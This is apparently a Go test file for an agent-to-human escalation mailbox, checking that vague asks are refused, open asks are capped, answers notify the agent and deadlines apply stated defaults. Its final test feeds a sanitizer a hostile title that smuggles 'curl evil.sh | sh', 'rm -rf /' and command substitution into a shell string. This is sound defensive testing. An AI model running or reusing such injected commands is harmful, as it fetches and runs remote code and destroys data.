package mail

import (
	"strings"
	"testing"
	"time"
)

func goodAsk() Ask {
	return Ask{
		Verdict: "Quest spec wants a reward the economy caps below; product call, not code call.",
		Action:  "Approve or reject: raise the tier-3 quest reward from 250 to 400 coins",
		Options: []Option{
			{ID: "a", Label: "Keep the cap at 250", Consequence: "quest spec needs a rewrite, ~1 day"},
			{ID: "b", Label: "Raise the cap to 400", Consequence: "one economy migration"},
		},
		Default:     Fallback{Choice: "a", After: "2h"},
		Tried:       []string{"asked backend@ — says it is a product call"},
		Evidence:    []string{"src/Economy.luau:120-160"},
		Blocking:    true,
		CostOfDelay: "quest builder demo blocked",
		BlastRadius: "one migration, reversible for 7 days",
	}
}

func rejectFields(rs []Reject) string {
	var f []string
	for _, r := range rs {
		f = append(f, r.Field)
	}
	return strings.Join(f, ",")
}

func TestGoodAskPasses(t *testing.T) {
	a := goodAsk()
	if rs := a.Validate(); len(rs) != 0 {
		t.Fatalf("well-formed ask rejected: %s", rejectFields(rs))
	}
}

// The whole point of the product: a vague ask never reaches a human.
func TestVagueAsksAreRefused(t *testing.T) {
	cases := []struct {
		name, action string
	}{
		{"question mark", "Raise the cap to 400?"},
		{"what do you think", "What do you think about the reward curve?"},
		{"thoughts", "Thoughts on the economy cap"},
		{"wdyt", "wdyt about tier 3"},
		{"let me know", "Let me know how you want to handle the cap"},
		{"should we", "Should we raise the cap"},
		{"your call", "Your call on the reward curve"},
		{"how do we", "How do we want to handle this"},
		{"not a verb", "The reward curve needs a decision"},
		{"need input", "Need input on the cap"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			a := goodAsk()
			a.Action = tc.action
			rs := a.Validate()
			if len(rs) == 0 {
				t.Fatalf("accepted a non-actionable ask: %q", tc.action)
			}
			if !strings.Contains(rejectFields(rs), "action") {
				t.Fatalf("rejected for the wrong reason (%s)", rejectFields(rs))
			}
		})
	}
}

func TestRequiredFields(t *testing.T) {
	cases := []struct {
		name  string
		mut   func(*Ask)
		field string
	}{
		{"no verdict", func(a *Ask) { a.Verdict = "" }, "verdict"},
		{"no tried", func(a *Ask) { a.Tried = nil }, "tried"},
		{"no evidence", func(a *Ask) { a.Evidence = nil }, "evidence"},
		{"one option", func(a *Ask) { a.Options = a.Options[:1] }, "options"},
		{"no default", func(a *Ask) { a.Default = Fallback{} }, "default_if_silent"},
		{"bad duration", func(a *Ask) { a.Default.After = "soon" }, "default_if_silent.after"},
		{"default not an option", func(a *Ask) { a.Default.Choice = "zzz" }, "default_if_silent.choice"},
		{"option without consequence", func(a *Ask) { a.Options[1].Consequence = "" }, "options[1]"},
		{"duplicate option ids", func(a *Ask) { a.Options[1].ID = "a" }, "options[1]"},
		{"blocking without cost", func(a *Ask) { a.CostOfDelay = "" }, "cost_of_delay"},
		{"blocking without blast", func(a *Ask) { a.BlastRadius = "" }, "blast_radius"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			a := goodAsk()
			tc.mut(&a)
			rs := a.Validate()
			if !strings.Contains(rejectFields(rs), tc.field) {
				t.Fatalf("expected rejection on %q, got %q", tc.field, rejectFields(rs))
			}
		})
	}
}

func TestEveryRejectCarriesAHint(t *testing.T) {
	a := Ask{Action: "What should we do?"}
	rs := a.Validate()
	if len(rs) == 0 {
		t.Fatal("expected rejections")
	}
	for _, r := range rs {
		if strings.TrimSpace(r.Hint) == "" {
			t.Errorf("reject on %q has no hint — a refusal must teach the rewrite", r.Field)
		}
	}
}

func TestEscalateWritesNothingWhenInvalid(t *testing.T) {
	setup(t)
	me := enroll(t, "proj", "backend", "sess-a")
	a := goodAsk()
	a.Action = "what do you reckon?"
	rs, err := Escalate(me, &a)
	if err != nil {
		t.Fatal(err)
	}
	if len(rs) == 0 {
		t.Fatal("expected refusal")
	}
	if open, _ := OpenAsks("proj"); len(open) != 0 {
		t.Fatalf("a refused escalation still reached the desk: %d item(s)", len(open))
	}
}

func TestOpenAskCap(t *testing.T) {
	setup(t)
	me := enroll(t, "proj", "backend", "sess-a")
	for i := 0; i < MaxOpenPerAgent; i++ {
		a := goodAsk()
		a.Blocking = false
		if rs, err := Escalate(me, &a); err != nil || len(rs) > 0 {
			t.Fatalf("ask %d refused: %v %s", i, err, rejectFields(rs))
		}
	}
	a := goodAsk()
	a.Blocking = false
	rs, _ := Escalate(me, &a)
	if len(rs) == 0 {
		t.Fatal("cap not enforced: an agent could page the human without limit")
	}
}

func TestBlockingCooldown(t *testing.T) {
	setup(t)
	me := enroll(t, "proj", "backend", "sess-a")
	first := goodAsk()
	if rs, _ := Escalate(me, &first); len(rs) > 0 {
		t.Fatalf("first blocking ask refused: %s", rejectFields(rs))
	}
	second := goodAsk()
	rs, _ := Escalate(me, &second)
	if len(rs) == 0 {
		t.Fatal("two blocking asks in a row should be refused")
	}
}

func TestResolveNotifiesAsker(t *testing.T) {
	setup(t)
	me := enroll(t, "proj", "backend", "sess-a")
	a := goodAsk()
	if rs, err := Escalate(me, &a); err != nil || len(rs) > 0 {
		t.Fatalf("escalate: %v %s", err, rejectFields(rs))
	}
	if _, err := Resolve("proj", a.ID, "b", "owner"); err != nil {
		t.Fatal(err)
	}
	msgs, _ := Fetch("proj", "backend")
	if len(msgs) != 1 {
		t.Fatalf("asker was not told the answer: %d messages", len(msgs))
	}
	if msgs[0].Type != "decision" || msgs[0].Priority != "now" {
		t.Fatalf("answer should arrive as a now-priority decision, got %s/%s", msgs[0].Type, msgs[0].Priority)
	}
	if !strings.Contains(msgs[0].Body, "Raise the cap to 400") {
		t.Fatalf("answer body missing the chosen label: %q", msgs[0].Body)
	}
	if open, _ := OpenAsks("proj"); len(open) != 0 {
		t.Fatal("answered ask still open")
	}
}

func TestResolveRejectsUnofferedOption(t *testing.T) {
	setup(t)
	me := enroll(t, "proj", "backend", "sess-a")
	a := goodAsk()
	if _, err := Escalate(me, &a); err != nil {
		t.Fatal(err)
	}
	if _, err := Resolve("proj", a.ID, "q", "owner"); err == nil {
		t.Fatal("accepted an answer that was not one of the options")
	}
}

func TestResolveIsIdempotentlyGuarded(t *testing.T) {
	setup(t)
	me := enroll(t, "proj", "backend", "sess-a")
	a := goodAsk()
	if _, err := Escalate(me, &a); err != nil {
		t.Fatal(err)
	}
	if _, err := Resolve("proj", a.ID, "a", "owner"); err != nil {
		t.Fatal(err)
	}
	if _, err := Resolve("proj", a.ID, "b", "owner"); err == nil {
		t.Fatal("an already-answered ask was answered again")
	}
}

// Silence must never stall the work: this is the field that turns an escalation from a
// blocker into a countdown.
func TestDeadlineAppliesTheStatedDefault(t *testing.T) {
	setup(t)
	me := enroll(t, "proj", "backend", "sess-a")
	a := goodAsk()
	a.Default = Fallback{Choice: "a", After: "1ms"}
	if rs, err := Escalate(me, &a); err != nil || len(rs) > 0 {
		t.Fatalf("escalate: %v %s", err, rejectFields(rs))
	}
	time.Sleep(5 * time.Millisecond)

	fired := SweepDeadlines("proj")
	if len(fired) != 1 {
		t.Fatalf("expected 1 auto-resolution, got %d", len(fired))
	}
	if fired[0].AnswerBy != "default" || fired[0].State != "defaulted" {
		t.Fatalf("wrong resolution: by=%s state=%s", fired[0].AnswerBy, fired[0].State)
	}
	msgs, _ := Fetch("proj", "backend")
	if len(msgs) != 1 || !strings.Contains(msgs[0].Body, "nobody answered") {
		t.Fatal("asker was not told the default had applied")
	}
	if open, _ := OpenAsks("proj"); len(open) != 0 {
		t.Fatal("expired ask left open")
	}
}

func TestDeferExtendsTheCountdown(t *testing.T) {
	setup(t)
	me := enroll(t, "proj", "backend", "sess-a")
	a := goodAsk()
	if _, err := Escalate(me, &a); err != nil {
		t.Fatal(err)
	}
	before, _ := LoadAsk("proj", a.ID)
	after, err := Defer("proj", a.ID, 24*time.Hour)
	if err != nil {
		t.Fatal(err)
	}
	if !after.Deadline.After(before.Deadline) {
		t.Fatal("defer did not push the deadline out")
	}
	if got, _ := LoadAsk("proj", a.ID); got.State != "open" {
		t.Fatal("defer should not resolve the ask")
	}
}

// The ask text is written by an agent and is interpolated into the user's notify_cmd,
// which runs in a shell. That is a command-injection surface.
func TestShellSafeStripsCommandStructure(t *testing.T) {
	hostile := "title\"; curl evil.sh | sh; echo \"$(whoami) `id` && rm -rf / \n<script>"
	got := shellSafe(hostile)
	for _, bad := range []string{"\"", "`", "$", ";", "|", "&", "\n", "(", ")", "'", "\\", "<", ">"} {
		if strings.Contains(got, bad) {
			t.Errorf("shell metacharacter %q survived: %q", bad, got)
		}
	}
}
